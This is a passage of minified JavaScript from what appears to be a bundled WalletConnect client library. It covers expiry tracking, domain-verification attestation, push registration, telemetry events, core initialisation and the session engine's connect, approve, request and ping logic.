this.restore(),this.cached.forEach(n=>this.expirations.set(n.target,n)),this.cached=[],this.registerEventListeners(),this.initialized=!0)}),dr(this,"has",n=>{try{const i=this.formatTarget(n);return typeof this.getExpiration(i)<"u"}catch{return!1}}),dr(this,"set",(n,i)=>{this.isInitialized();const s=this.formatTarget(n),o={target:s,expiry:i};this.expirations.set(s,o),this.checkExpiry(s,o),this.events.emit(Tn.created,{target:s,expiration:o})}),dr(this,"get",n=>{this.isInitialized();const i=this.formatTarget(n);return this.getExpiration(i)}),dr(this,"del",n=>{if(this.isInitialized(),this.has(n)){const i=this.formatTarget(n),s=this.getExpiration(i);this.expirations.delete(i),this.events.emit(Tn.deleted,{target:i,expiration:s})}}),dr(this,"on",(n,i)=>{this.events.on(n,i)}),dr(this,"once",(n,i)=>{this.events.once(n,i)}),dr(this,"off",(n,i)=>{this.events.off(n,i)}),dr(this,"removeListener",(n,i)=>{this.events.removeListener(n,i)}),this.logger=_r(r,this.name)}get context(){return Jr(this.logger)}get storageKey(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//"+this.name}get length(){return this.expirations.size}get keys(){return Array.from(this.expirations.keys())}get values(){return Array.from(this.expirations.values())}formatTarget(e){if(typeof e=="string")return jO(e);if(typeof e=="number")return HO(e);const{message:r}=ee("UNKNOWN_TYPE",`Target type: ${typeof e}`);throw new Error(r)}async setExpirations(e){await this.core.storage.setItem(this.storageKey,e)}async getExpirations(){return await this.core.storage.getItem(this.storageKey)}async persist(){await this.setExpirations(this.values),this.events.emit(Tn.sync)}async restore(){try{const e=await this.getExpirations();if(typeof e>"u"||!e.length)return;if(this.expirations.size){const{message:r}=ee("RESTORE_WILL_OVERRIDE",this.name);throw this.logger.error(r),new Error(r)}this.cached=e,this.logger.debug(`Successfully Restored expirations for ${this.name}`),this.logger.trace({type:"method",method:"restore",expirations:this.values})}catch(e){this.logger.debug(`Failed to Restore expirations for ${this.name}`),this.logger.error(e)}}getExpiration(e){const r=this.expirations.get(e);if(!r){const{message:n}=ee("NO_MATCHING_KEY",`${this.name}: ${e}`);throw this.logger.warn(n),new Error(n)}return r}checkExpiry(e,r){const{expiry:n}=r;X.toMiliseconds(n)-Date.now()<=0&&this.expire(e,r)}expire(e,r){this.expirations.delete(e),this.events.emit(Tn.expired,{target:e,expiration:r})}checkExpirations(){this.core.relayer.connected&&this.expirations.forEach((e,r)=>this.checkExpiry(r,e))}registerEventListeners(){this.core.heartbeat.on(dh.pulse,()=>this.checkExpirations()),this.events.on(Tn.created,e=>{const r=Tn.created;this.logger.info(`Emitting ${r}`),this.logger.debug({type:"event",event:r,data:e}),this.persist()}),this.events.on(Tn.expired,e=>{const r=Tn.expired;this.logger.info(`Emitting ${r}`),this.logger.debug({type:"event",event:r,data:e}),this.persist()}),this.events.on(Tn.deleted,e=>{const r=Tn.deleted;this.logger.info(`Emitting ${r}`),this.logger.debug({type:"event",event:r,data:e}),this.persist()})}isInitialized(){if(!this.initialized){const{message:e}=ee("NOT_INITIALIZED",this.name);throw new Error(e)}}};var pM=Object.defineProperty,gM=(t,e,r)=>e in t?pM(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,_t=(t,e,r)=>gM(t,typeof e!="symbol"?e+"":e,r);let wM=class extends wD{constructor(e,r,n){super(e,r,n),this.core=e,this.logger=r,this.store=n,_t(this,"name",wB),_t(this,"abortController"),_t(this,"isDevEnv"),_t(this,"verifyUrlV3",yB),_t(this,"storagePrefix",Ki),_t(this,"version",FC),_t(this,"publicKey"),_t(this,"fetchPromise"),_t(this,"init",async()=>{var i;this.isDevEnv||(this.publicKey=await this.store.getItem(this.storeKey),this.publicKey&&X.toMiliseconds((i=this.publicKey)==null?void 0:i.expiresAt)<Date.now()&&(this.logger.debug("verify v2 public key expired"),await this.removePublicKey()))}),_t(this,"register",async i=>{if(!Ff()||this.isDevEnv)return;const s=window.location.origin,{id:o,decryptedId:a}=i,c=`${this.verifyUrlV3}/attestation?projectId=${this.core.projectId}&origin=${s}&id=${o}&decryptedId=${a}`;try{const l=wc.getDocument(),u=this.startAbortTimer(X.ONE_SECOND*5),h=await new Promise((d,f)=>{const g=()=>{window.removeEventListener("message",w),l.body.removeChild(p),f("attestation aborted")};this.abortController.signal.addEventListener("abort",g);const p=l.createElement("iframe");p.src=c,p.style.display="none",p.addEventListener("error",g,{signal:this.abortController.signal});const w=m=>{if(m.data&&typeof m.data=="string")try{const b=JSON.parse(m.data);if(b.type==="verify_attestation"){if(Km(b.attestation).payload.id!==o)return;clearInterval(u),l.body.removeChild(p),this.abortController.signal.removeEventListener("abort",g),window.removeEventListener("message",w),d(b.attestation===null?"":b.attestation)}}catch(b){this.logger.warn(b)}};l.body.appendChild(p),window.addEventListener("message",w,{signal:this.abortController.signal})});return this.logger.debug("jwt attestation",h),h}catch(l){this.logger.warn(l)}return""}),_t(this,"resolve",async i=>{if(this.isDevEnv)return"";const{attestationId:s,hash:o,encryptedId:a}=i;if(s===""){this.logger.debug("resolve: attestationId is empty, skipping");return}if(s){if(Km(s).payload.id!==a)return;const l=await this.isValidJwtAttestation(s);if(l){if(!l.isVerified){this.logger.warn("resolve: jwt attestation: origin url not verified");return}return l}}if(!o)return;const c=this.getVerifyUrl(i==null?void 0:i.verifyUrl);return this.fetchAttestation(o,c)}),_t(this,"fetchAttestation",async(i,s)=>{this.logger.debug(`resolving attestation: ${i} from url: ${s}`);const o=this.startAbortTimer(X.ONE_SECOND*5),a=await fetch(`${s}/attestation/${i}?v2Supported=true`,{signal:this.abortController.signal});return clearTimeout(o),a.status===200?await a.json():void 0}),_t(this,"getVerifyUrl",i=>{let s=i||Cd;return bB.includes(s)||(this.logger.info(`verify url: ${s}, not included in trusted list, assigning default: ${Cd}`),s=Cd),s}),_t(this,"fetchPublicKey",async()=>{try{this.logger.debug(`fetching public key from: ${this.verifyUrlV3}`);const i=this.startAbortTimer(X.FIVE_SECONDS),s=await fetch(`${this.verifyUrlV3}/public-key`,{signal:this.abortController.signal});return clearTimeout(i),await s.json()}catch(i){this.logger.warn(i)}}),_t(this,"persistPublicKey",async i=>{this.logger.debug("persisting public key to local storage",i),await this.store.setItem(this.storeKey,i),this.publicKey=i}),_t(this,"removePublicKey",async()=>{this.logger.debug("removing verify v2 public key from storage"),await this.store.removeItem(this.storeKey),this.publicKey=void 0}),_t(this,"isValidJwtAttestation",async i=>{const s=await this.getPublicKey();try{if(s)return this.validateAttestation(i,s)}catch(a){this.logger.error(a),this.logger.warn("error validating attestation")}const o=await this.fetchAndPersistPublicKey();try{if(o)return this.validateAttestation(i,o)}catch(a){this.logger.error(a),this.logger.warn("error validating attestation")}}),_t(this,"getPublicKey",async()=>this.publicKey?this.publicKey:await this.fetchAndPersistPublicKey()),_t(this,"fetchAndPersistPublicKey",async()=>{if(this.fetchPromise)return await this.fetchPromise,this.publicKey;this.fetchPromise=new Promise(async s=>{const o=await this.fetchPublicKey();o&&(await this.persistPublicKey(o),s(o))});const i=await this.fetchPromise;return this.fetchPromise=void 0,i}),_t(this,"validateAttestation",(i,s)=>{const o=y$(i,s.publicKey),a={hasExpired:X.toMiliseconds(o.exp)<Date.now(),payload:o};if(a.hasExpired)throw this.logger.warn("resolve: jwt attestation expired"),new Error("JWT attestation expired");return{origin:a.payload.origin,isScam:a.payload.isScam,isVerified:a.payload.isVerified}}),this.logger=_r(r,this.name),this.abortController=new AbortController,this.isDevEnv=Fb(),this.init()}get storeKey(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//verify:public:key"}get context(){return Jr(this.logger)}startAbortTimer(e){return this.abortController=new AbortController,setTimeout(()=>this.abortController.abort(),X.toMiliseconds(e))}};var mM=Object.defineProperty,yM=(t,e,r)=>e in t?mM(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,N5=(t,e,r)=>yM(t,typeof e!="symbol"?e+"":e,r);let bM=class extends mD{constructor(e,r){super(e,r),this.projectId=e,this.logger=r,N5(this,"context",vB),N5(this,"registerDeviceToken",async n=>{const{clientId:i,token:s,notificationType:o,enableEncrypted:a=!1}=n,c=`${EB}/${this.projectId}/clients`;await fetch(c,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({client_id:i,type:o,token:s,always_raw:a})})}),this.logger=_r(r,this.context)}};var vM=Object.defineProperty,P5=Object.getOwnPropertySymbols,EM=Object.prototype.hasOwnProperty,CM=Object.prototype.propertyIsEnumerable,my=(t,e,r)=>e in t?vM(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,kh=(t,e)=>{for(var r in e||(e={}))EM.call(e,r)&&my(t,r,e[r]);if(P5)for(var r of P5(e))CM.call(e,r)&&my(t,r,e[r]);return t},Ft=(t,e,r)=>my(t,typeof e!="symbol"?e+"":e,r);let AM=class extends yD{constructor(e,r,n=!0){super(e,r,n),this.core=e,this.logger=r,Ft(this,"context",AB),Ft(this,"storagePrefix",Ki),Ft(this,"storageVersion",CB),Ft(this,"events",new Map),Ft(this,"shouldPersist",!1),Ft(this,"init",async()=>{if(!Fb())try{const i={eventId:n3(),timestamp:Date.now(),domain:this.getAppDomain(),props:{event:"INIT",type:"",properties:{client_id:await this.core.crypto.getClientId(),user_agent:GE(this.core.relayer.protocol,this.core.relayer.version,ly)}}};await this.sendEvent([i])}catch(i){this.logger.warn(i)}}),Ft(this,"createEvent",i=>{const{event:s="ERROR",type:o="",properties:{topic:a,trace:c}}=i,l=n3(),u=this.core.projectId||"",h=Date.now(),d=kh({eventId:l,timestamp:h,props:{event:s,type:o,properties:{topic:a,trace:c}},bundleId:u,domain:this.getAppDomain()},this.setMethods(l));return this.telemetryEnabled&&(this.events.set(l,d),this.shouldPersist=!0),d}),Ft(this,"getEvent",i=>{const{eventId:s,topic:o}=i;if(s)return this.events.get(s);const a=Array.from(this.events.values()).find(c=>c.props.properties.topic===o);if(a)return kh(kh({},a),this.setMethods(a.eventId))}),Ft(this,"deleteEvent",i=>{const{eventId:s}=i;this.events.delete(s),this.shouldPersist=!0}),Ft(this,"setEventListeners",()=>{this.core.heartbeat.on(dh.pulse,async()=>{this.shouldPersist&&await this.persist(),this.events.forEach(i=>{X.fromMiliseconds(Date.now())-X.fromMiliseconds(i.timestamp)>xB&&(this.events.delete(i.eventId),this.shouldPersist=!0)})})}),Ft(this,"setMethods",i=>({addTrace:s=>this.addTrace(i,s),setError:s=>this.setError(i,s)})),Ft(this,"addTrace",(i,s)=>{const o=this.events.get(i);o&&(o.props.properties.trace.push(s),this.events.set(i,o),this.shouldPersist=!0)}),Ft(this,"setError",(i,s)=>{const o=this.events.get(i);o&&(o.props.type=s,o.timestamp=Date.now(),this.events.set(i,o),this.shouldPersist=!0)}),Ft(this,"persist",async()=>{await this.core.storage.setItem(this.storageKey,Array.from(this.events.values())),this.shouldPersist=!1}),Ft(this,"restore",async()=>{try{const i=await this.core.storage.getItem(this.storageKey)||[];if(!i.length)return;i.forEach(s=>{this.events.set(s.eventId,kh(kh({},s),this.setMethods(s.eventId)))})}catch(i){this.logger.warn(i)}}),Ft(this,"submit",async()=>{if(!this.telemetryEnabled||this.events.size===0)return;const i=[];for(const[s,o]of this.events)o.props.type&&i.push(o);if(i.length!==0)try{if((await this.sendEvent(i)).ok)for(const s of i)this.events.delete(s.eventId),this.shouldPersist=!0}catch(s){this.logger.warn(s)}}),Ft(this,"sendEvent",async i=>{const s=this.getAppDomain()?"":"&sp=desktop";return await fetch(`${IB}?projectId=${this.core.projectId}&st=events_sdk&sv=js-${ly}${s}`,{method:"POST",body:JSON.stringify(i)})}),Ft(this,"getAppDomain",()=>WE().url),this.logger=_r(r,this.context),this.telemetryEnabled=n,n?this.restore().then(async()=>{await this.submit(),this.setEventListeners()}):this.persist()}get storageKey(){return this.storagePrefix+this.storageVersion+this.core.customStoragePrefix+"//"+this.context}};var xM=Object.defineProperty,k5=Object.getOwnPropertySymbols,IM=Object.prototype.hasOwnProperty,SM=Object.prototype.propertyIsEnumerable,yy=(t,e,r)=>e in t?xM(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,O5=(t,e)=>{for(var r in e||(e={}))IM.call(e,r)&&yy(t,r,e[r]);if(k5)for(var r of k5(e))SM.call(e,r)&&yy(t,r,e[r]);return t},dt=(t,e,r)=>yy(t,typeof e!="symbol"?e+"":e,r);let NM=class eA extends sD{constructor(e){var r;super(e),dt(this,"protocol",MC),dt(this,"version",FC),dt(this,"name",cy),dt(this,"relayUrl"),dt(this,"projectId"),dt(this,"customStoragePrefix"),dt(this,"events",new mn.EventEmitter),dt(this,"logger"),dt(this,"heartbeat"),dt(this,"relayer"),dt(this,"crypto"),dt(this,"storage"),dt(this,"history"),dt(this,"expirer"),dt(this,"pairing"),dt(this,"verify"),dt(this,"echoClient"),dt(this,"linkModeSupportedApps"),dt(this,"eventClient"),dt(this,"initialized",!1),dt(this,"logChunkController"),dt(this,"on",(a,c)=>this.events.on(a,c)),dt(this,"once",(a,c)=>this.events.once(a,c)),dt(this,"off",(a,c)=>this.events.off(a,c)),dt(this,"removeListener",(a,c)=>this.events.removeListener(a,c)),dt(this,"dispatchEnvelope",({topic:a,message:c,sessionExists:l})=>{if(!a||!c)return;const u={topic:a,message:c,publishedAt:Date.now(),transportType:mt.link_mode};this.relayer.onLinkMessageEvent(u,{sessionExists:l})});const n=this.getGlobalCore(e==null?void 0:e.customStoragePrefix);if(n)try{return this.customStoragePrefix=n.customStoragePrefix,this.logger=n.logger,this.heartbeat=n.heartbeat,this.crypto=n.crypto,this.history=n.history,this.expirer=n.expirer,this.storage=n.storage,this.relayer=n.relayer,this.pairing=n.pairing,this.verify=n.verify,this.echoClient=n.echoClient,this.linkModeSupportedApps=n.linkModeSupportedApps,this.eventClient=n.eventClient,this.initialized=n.initialized,this.logChunkController=n.logChunkController,n}catch(a){console.warn("Failed to copy global core",a)}this.projectId=e==null?void 0:e.projectId,this.relayUrl=(e==null?void 0:e.relayUrl)||jC,this.customStoragePrefix=e!=null&&e.customStoragePrefix?`:${e.customStoragePrefix}`:"";const i=Zg({level:typeof(e==null?void 0:e.logger)=="string"&&e.logger?e.logger:GD.logger,name:cy}),{logger:s,chunkLoggerController:o}=rD({opts:i,maxSizeInBytes:e==null?void 0:e.maxLogBlobSizeInBytes,loggerOverride:e==null?void 0:e.logger});this.logChunkController=o,(r=this.logChunkController)!=null&&r.downloadLogsBlobInBrowser&&(window.downloadLogsBlobInBrowser=async()=>{var a,c;(a=this.logChunkController)!=null&&a.downloadLogsBlobInBrowser&&((c=this.logChunkController)==null||c.downloadLogsBlobInBrowser({clientId:await this.crypto.getClientId()}))}),this.logger=_r(s,this.name),this.heartbeat=new sR,this.crypto=new eU(this,this.logger,e==null?void 0:e.keychain),this.history=new uM(this,this.logger),this.expirer=new fM(this,this.logger),this.storage=e!=null&&e.storage?e.storage:new MR(O5(O5({},KD),e==null?void 0:e.storageOptions)),this.relayer=new NU({core:this,logger:this.logger,relayUrl:this.relayUrl,projectId:this.projectId}),this.pairing=new aM(this,this.logger),this.verify=new wM(this,this.logger,this.storage),this.echoClient=new bM(this.projectId||"",this.logger),this.linkModeSupportedApps=[],this.eventClient=new AM(this,this.logger,e==null?void 0:e.telemetryEnabled),this.setGlobalCore(this)}static async init(e){const r=new eA(e);await r.initialize();const n=await r.crypto.getClientId();return await r.storage.setItem(aB,n),r}get context(){return Jr(this.logger)}async start(){this.initialized||await this.initialize()}async getLogsBlob(){var e;return(e=this.logChunkController)==null?void 0:e.logsToBlob({clientId:await this.crypto.getClientId()})}async addLinkModeSupportedApp(e){this.linkModeSupportedApps.includes(e)||(this.linkModeSupportedApps.push(e),await this.storage.setItem(l5,this.linkModeSupportedApps))}async initialize(){this.logger.trace("Initialized");try{await this.crypto.init(),await this.history.init(),await this.expirer.init(),await this.relayer.init(),await this.heartbeat.init(),await this.pairing.init(),this.linkModeSupportedApps=await this.storage.getItem(l5)||[],this.initialized=!0,this.logger.info("Core Initialization Success")}catch(e){throw this.logger.warn(`Core Initialization Failure at epoch ${Date.now()}`,e),this.logger.error(e.message),e}}getGlobalCore(e=""){try{if(this.isGlobalCoreDisabled())return;const r=`_walletConnectCore_${e}`,n=`${r}_count`;return globalThis[n]=(globalThis[n]||0)+1,globalThis[n]>1&&console.warn(`WalletConnect Core is already initialized. This is probably a mistake and can lead to unexpected behavior. Init() was called ${globalThis[n]} times.`),globalThis[r]}catch(r){console.warn("Failed to get global WalletConnect core",r);return}}setGlobalCore(e){var r;try{if(this.isGlobalCoreDisabled())return;const n=`_walletConnectCore_${((r=e.opts)==null?void 0:r.customStoragePrefix)||""}`;globalThis[n]=e}catch(n){console.warn("Failed to set global WalletConnect core",n)}}isGlobalCoreDisabled(){try{return typeof process<"u"&&WD.DISABLE_GLOBAL_CORE==="true"}catch{return!0}}};const PM=NM,tA="wc",rA=2,nA="client",Yb=`${tA}@${rA}:${nA}:`,gw={name:nA,logger:"error"},_5="WALLETCONNECT_DEEPLINK_CHOICE",kM="proposal",T5="Proposal expired",OM="session",Gc=X.SEVEN_DAYS,_M="engine",zt={wc_sessionPropose:{req:{ttl:X.FIVE_MINUTES,prompt:!0,tag:1100},res:{ttl:X.FIVE_MINUTES,prompt:!1,tag:1101},reject:{ttl:X.FIVE_MINUTES,prompt:!1,tag:1120},autoReject:{ttl:X.FIVE_MINUTES,prompt:!1,tag:1121}},wc_sessionSettle:{req:{ttl:X.FIVE_MINUTES,prompt:!1,tag:1102},res:{ttl:X.FIVE_MINUTES,prompt:!1,tag:1103}},wc_sessionUpdate:{req:{ttl:X.ONE_DAY,prompt:!1,tag:1104},res:{ttl:X.ONE_DAY,prompt:!1,tag:1105}},wc_sessionExtend:{req:{ttl:X.ONE_DAY,prompt:!1,tag:1106},res:{ttl:X.ONE_DAY,prompt:!1,tag:1107}},wc_sessionRequest:{req:{ttl:X.FIVE_MINUTES,prompt:!0,tag:1108},res:{ttl:X.FIVE_MINUTES,prompt:!1,tag:1109}},wc_sessionEvent:{req:{ttl:X.FIVE_MINUTES,prompt:!0,tag:1110},res:{ttl:X.FIVE_MINUTES,prompt:!1,tag:1111}},wc_sessionDelete:{req:{ttl:X.ONE_DAY,prompt:!1,tag:1112},res:{ttl:X.ONE_DAY,prompt:!1,tag:1113}},wc_sessionPing:{req:{ttl:X.ONE_DAY,prompt:!1,tag:1114},res:{ttl:X.ONE_DAY,prompt:!1,tag:1115}},wc_sessionAuthenticate:{req:{ttl:X.ONE_HOUR,prompt:!0,tag:1116},res:{ttl:X.ONE_HOUR,prompt:!1,tag:1117},reject:{ttl:X.FIVE_MINUTES,prompt:!1,tag:1118},autoReject:{ttl:X.FIVE_MINUTES,prompt:!1,tag:1119}}},ww={min:X.FIVE_MINUTES,max:X.SEVEN_DAYS},vi={idle:"IDLE",active:"ACTIVE"},$5={eth_sendTransaction:{key:""},eth_sendRawTransaction:{key:""},wallet_sendCalls:{key:""},solana_signTransaction:{key:"signature"},solana_signAllTransactions:{key:"transactions"},solana_signAndSendTransaction:{key:"signature"}},TM="request",$M=["wc_sessionPropose","wc_sessionRequest","wc_authRequest","wc_sessionAuthenticate"],RM="wc",DM="auth",BM="authKeys",LM="pairingTopics",UM="requests",e1=`${RM}@${1.5}:${DM}:`,D0=`${e1}:PUB_KEY`;var MM=Object.defineProperty,FM=Object.defineProperties,zM=Object.getOwnPropertyDescriptors,R5=Object.getOwnPropertySymbols,jM=Object.prototype.hasOwnProperty,HM=Object.prototype.propertyIsEnumerable,by=(t,e,r)=>e in t?MM(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,lt=(t,e)=>{for(var r in e||(e={}))jM.call(e,r)&&by(t,r,e[r]);if(R5)for(var r of R5(e))HM.call(e,r)&&by(t,r,e[r]);return t},br=(t,e)=>FM(t,zM(e)),J=(t,e,r)=>by(t,typeof e!="symbol"?e+"":e,r);let qM=class extends CD{constructor(e){super(e),J(this,"name",_M),J(this,"events",new Tb),J(this,"initialized",!1),J(this,"requestQueue",{state:vi.idle,queue:[]}),J(this,"sessionRequestQueue",{state:vi.idle,queue:[]}),J(this,"requestQueueDelay",X.ONE_SECOND),J(this,"expectedPairingMethodMap",new Map),J(this,"recentlyDeletedMap",new Map),J(this,"recentlyDeletedLimit",200),J(this,"relayMessageCache",[]),J(this,"pendingSessions",new Map),J(this,"init",async()=>{this.initialized||(await this.cleanup(),this.registerRelayerEvents(),this.registerExpirerEvents(),this.registerPairingEvents(),await this.registerLinkModeListeners(),this.client.core.pairing.register({methods:Object.keys(zt)}),this.initialized=!0,setTimeout(async()=>{await this.processPendingMessageEvents(),this.sessionRequestQueue.queue=this.getPendingSessionRequests(),this.processSessionRequestQueue()},X.toMiliseconds(this.requestQueueDelay)))}),J(this,"connect",async r=>{this.isInitialized(),await this.confirmOnlineStateOrThrow();const n=br(lt({},r),{requiredNamespaces:r.requiredNamespaces||{},optionalNamespaces:r.optionalNamespaces||{}});await this.isValidConnect(n);const{pairingTopic:i,requiredNamespaces:s,optionalNamespaces:o,sessionProperties:a,scopedProperties:c,relays:l}=n;let u=i,h,d=!1;try{if(u){const C=this.client.core.pairing.pairings.get(u);this.client.logger.warn("connect() with existing pairing topic is deprecated and will be removed in the next major release."),d=C.active}}catch(C){throw this.client.logger.error(`connect() -> pairing.get(${u}) failed`),C}if(!u||!d){const{topic:C,uri:N}=await this.client.core.pairing.create();u=C,h=N}if(!u){const{message:C}=ee("NO_MATCHING_KEY",`connect() pairing topic: ${u}`);throw new Error(C)}const f=await this.client.core.crypto.generateKeyPair(),g=zt.wc_sessionPropose.req.ttl||X.FIVE_MINUTES,p=Dt(g),w=br(lt(lt({requiredNamespaces:s,optionalNamespaces:o,relays:l??[{protocol:zC}],proposer:{publicKey:f,metadata:this.client.metadata},expiryTimestamp:p,pairingTopic:u},a&&{sessionProperties:a}),c&&{scopedProperties:c}),{id:ki()}),m=Xe("session_connect",w.id),{reject:b,resolve:v,done:x}=ma(g,T5),I=({id:C})=>{C===w.id&&(this.client.events.off("proposal_expire",I),this.pendingSessions.delete(w.id),this.events.emit(m,{error:{message:T5,code:0}}))};return this.client.events.on("proposal_expire",I),this.events.once(m,({error:C,session:N})=>{this.client.events.off("proposal_expire",I),C?b(C):N&&v(N)}),await this.sendRequest({topic:u,method:"wc_sessionPropose",params:w,throwOnFailedPublish:!0,clientRpcId:w.id}),await this.setProposal(w.id,w),{uri:h,approval:x}}),J(this,"pair",async r=>{this.isInitialized(),await this.confirmOnlineStateOrThrow();try{return await this.client.core.pairing.pair(r)}catch(n){throw this.client.logger.error("pair() failed"),n}}),J(this,"approve",async r=>{var n,i,s;const o=this.client.core.eventClient.createEvent({properties:{topic:(n=r==null?void 0:r.id)==null?void 0:n.toString(),trace:[Wn.session_approve_started]}});try{this.isInitialized(),await this.confirmOnlineStateOrThrow()}catch(P){throw o.setError(Yo.no_internet_connection),P}try{await this.isValidProposalId(r==null?void 0:r.id)}catch(P){throw this.client.logger.error(`approve() -> proposal.get(${r==null?void 0:r.id}) failed`),o.setError(Yo.proposal_not_found),P}try{await this.isValidApprove(r)}catch(P){throw this.client.logger.error("approve() -> isValidApprove() failed"),o.setError(Yo.session_approve_namespace_validation_failure),P}const{id:a,relayProtocol:c,namespaces:l,sessionProperties:u,scopedProperties:h,sessionConfig:d}=r,f=this.client.proposal.get(a);this.client.core.eventClient.deleteEvent({eventId:o.eventId});const{pairingTopic:g,proposer:p,requiredNamespaces:w,optionalNamespaces:m}=f;let b=(i=this.client.core.eventClient)==null?void 0:i.getEvent({topic:g});b||(b=(s=this.client.core.eventClient)==null?void 0:s.createEvent({type:Wn.session_approve_started,properties:{topic:g,trace:[Wn.session_approve_started,Wn.session_namespaces_validation_success]}}));const v=await this.client.core.crypto.generateKeyPair(),x=p.publicKey,I=await this.client.core.crypto.generateSharedKey(v,x),C=lt(lt(lt({relay:{protocol:c??"irn"},namespaces:l,controller:{publicKey:v,metadata:this.client.metadata},expiry:Dt(Gc)},u&&{sessionProperties:u}),h&&{scopedProperties:h}),d&&{sessionConfig:d}),N=mt.relay;b.addTrace(Wn.subscribing_session_topic);try{await this.client.core.relayer.subscribe(I,{transportType:N})}catch(P){throw b.setError(Yo.subscribe_session_topic_failure),P}b.addTrace(Wn.subscribe_session_topic_success);const S=br(lt({},C),{topic:I,requiredNamespaces:w,optionalNamespaces:m,pairingTopic:g,acknowledged:!1,self:C.controller,peer:{publicKey:p.publicKey,metadata:p.metadata},controller:v,transportType:mt.relay});await this.client.session.set(I,S),b.addTrace(Wn.store_session);try{b.addTrace(Wn.publishing_session_settle),await this.sendRequest({topic:I,method:"wc_sessionSettle",params:C,throwOnFailedPublish:!0}).catch(P=>{throw b==null||b.setError(Yo.session_settle_publish_failure),P}),b.addTrace(Wn.session_settle_publish_success),b.addTrace(Wn.publishing_session_approve),await this.sendResult({id:a,topic:g,result:{relay:{protocol:c??"irn"},responderPublicKey:v},throwOnFailedPublish:!0}).catch(P=>{throw b==null||b.setError(Yo.session_approve_publish_failure),P}),b.addTrace(Wn.session_approve_publish_success)}catch(P){throw this.client.logger.error(P),this.client.session.delete(I,it("USER_DISCONNECTED")),await this.client.core.relayer.unsubscribe(I),P}return this.client.core.eventClient.deleteEvent({eventId:b.eventId}),await this.client.core.pairing.updateMetadata({topic:g,metadata:p.metadata}),await this.client.proposal.delete(a,it("USER_DISCONNECTED")),await this.client.core.pairing.activate({topic:g}),await this.setExpiry(I,Dt(Gc)),{topic:I,acknowledged:()=>Promise.resolve(this.client.session.get(I))}}),J(this,"reject",async r=>{this.isInitialized(),await this.confirmOnlineStateOrThrow();try{await this.isValidReject(r)}catch(o){throw this.client.logger.error("reject() -> isValidReject() failed"),o}const{id:n,reason:i}=r;let s;try{s=this.client.proposal.get(n).pairingTopic}catch(o){throw this.client.logger.error(`reject() -> proposal.get(${n}) failed`),o}s&&(await this.sendError({id:n,topic:s,error:i,rpcOpts:zt.wc_sessionPropose.reject}),await this.client.proposal.delete(n,it("USER_DISCONNECTED")))}),J(this,"update",async r=>{this.isInitialized(),await this.confirmOnlineStateOrThrow();try{await this.isValidUpdate(r)}catch(h){throw this.client.logger.error("update() -> isValidUpdate() failed"),h}const{topic:n,namespaces:i}=r,{done:s,resolve:o,reject:a}=ma(),c=ki(),l=$a().toString(),u=this.client.session.get(n).namespaces;return this.events.once(Xe("session_update",c),({error:h})=>{h?a(h):o()}),await this.client.session.update(n,{namespaces:i}),await this.sendRequest({topic:n,method:"wc_sessionUpdate",params:{namespaces:i},throwOnFailedPublish:!0,clientRpcId:c,relayRpcId:l}).catch(h=>{this.client.logger.error(h),this.client.session.update(n,{namespaces:u}),a(h)}),{acknowledged:s}}),J(this,"extend",async r=>{this.isInitialized(),await this.confirmOnlineStateOrThrow();try{await this.isValidExtend(r)}catch(c){throw this.client.logger.error("extend() -> isValidExtend() failed"),c}const{topic:n}=r,i=ki(),{done:s,resolve:o,reject:a}=ma();return this.events.once(Xe("session_extend",i),({error:c})=>{c?a(c):o()}),await this.setExpiry(n,Dt(Gc)),this.sendRequest({topic:n,method:"wc_sessionExtend",params:{},clientRpcId:i,throwOnFailedPublish:!0}).catch(c=>{a(c)}),{acknowledged:s}}),J(this,"request",async r=>{this.isInitialized();try{await this.isValidRequest(r)}catch(m){throw this.client.logger.error("request() -> isValidRequest() failed"),m}const{chainId:n,request:i,topic:s,expiry:o=zt.wc_sessionRequest.req.ttl}=r,a=this.client.session.get(s);(a==null?void 0:a.transportType)===mt.relay&&await this.confirmOnlineStateOrThrow();const c=ki(),l=$a().toString(),{done:u,resolve:h,reject:d}=ma(o,"Request expired. Please try again.");this.events.once(Xe("session_request",c),({error:m,result:b})=>{m?d(m):h(b)});const f="wc_sessionRequest",g=this.getAppLinkIfEnabled(a.peer.metadata,a.transportType);if(g)return await this.sendRequest({clientRpcId:c,relayRpcId:l,topic:s,method:f,params:{request:br(lt({},i),{expiryTimestamp:Dt(o)}),chainId:n},expiry:o,throwOnFailedPublish:!0,appLink:g}).catch(m=>d(m)),this.client.events.emit("session_request_sent",{topic:s,request:i,chainId:n,id:c}),await u();const p={request:br(lt({},i),{expiryTimestamp:Dt(o)}),chainId:n},w=this.shouldSetTVF(f,p);return await Promise.all([new Promise(async m=>{await this.sendRequest(lt({clientRpcId:c,relayRpcId:l,topic:s,method:f,params:p,expiry:o,throwOnFailedPublish:!0},w&&{tvf:this.getTVFParams(c,p)})).catch(b=>d(b)),this.client.events.emit("session_request_sent",{topic:s,request:i,chainId:n,id:c}),m()}),new Promise(async m=>{var b;if(!((b=a.sessionConfig)!=null&&b.disableDeepLink)){const v=await GO(this.client.core.storage,_5);await qO({id:c,topic:s,wcDeepLink:v})}m()}),u()]).then(m=>m[2])}),J(this,"respond",async r=>{this.isInitialized(),await this.isValidRespond(r);const{topic:n,response:i}=r,{id:s}=i,o=this.client.session.get(n);o.transportType===mt.relay&&await this.confirmOnlineStateOrThrow();const a=this.getAppLinkIfEnabled(o.peer.metadata,o.transportType);Oi(i)?await this.sendResult({id:s,topic:n,result:i.result,throwOnFailedPublish:!0,appLink:a}):Mn(i)&&await this.sendError({id:s,topic:n,error:i.error,appLink:a}),this.cleanupAfterResponse(r)}),J(this,"ping",async r=>{this.isInitialized(),await this.confirmOnlineStateOrThrow();try{await this.isValidPing(r)}catch(i){throw this.client.logger.error("ping() -> isValidPing() failed"),i}const{topic:n}=r;if(this.client.session.keys.includes(n)){const i=ki(),s=$a().toString(),{done:o,resolve:a,reject:c}=ma();this.events.once(Xe("session_ping",i),({error:l})=>{l?c(l):a()}),await Promise.all([this.sendRequest({topic:n,method:"wc_sessionPing",params:{},throwOnFailedPublish:!0,clientRpcId:i,relayRpcId:s}),o()])}else 